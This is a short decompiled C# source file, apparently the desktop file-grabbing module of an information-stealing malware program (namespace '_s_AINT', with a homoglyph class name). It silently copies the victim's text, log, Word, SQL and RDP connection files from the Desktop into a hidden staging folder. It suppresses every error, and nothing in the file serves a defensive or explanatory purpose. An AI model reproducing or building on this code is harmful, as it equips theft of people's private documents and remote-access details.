using System;
using System.IO;
namespace _s_AINT
{
	class сDesktop
	{
			public static void Desktop()
			{
				int num = 0;
				try
				{
					string text = Program.workdir + "\\Desktop Files";
					string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
					if (!Directory.Exists(text))
					{
						Directory.CreateDirectory(text);
					}
					if (Directory.Exists(folderPath))
					{
						string[] files = Directory.GetFiles(folderPath);
						foreach (string text2 in files)
						{
							try
							{
								string extension = Path.GetExtension(text2.ToLower());
								switch (extension)
								{
									default:
										if (extension == ".sql")
										{
											break;
										}
										goto end_IL_0049;
									case ".txt":
									case ".rtf":
									case ".log":
									case ".doc":
									case ".docx":
									case ".rdp":
										break;
								}
								File.Copy(text2, text + "\\" + Path.GetFileName(text2));
								num++;
							end_IL_0049:;
							}
							catch
							{
							}
						}
					}
				}
				catch
				{
				}
		}
	}
}
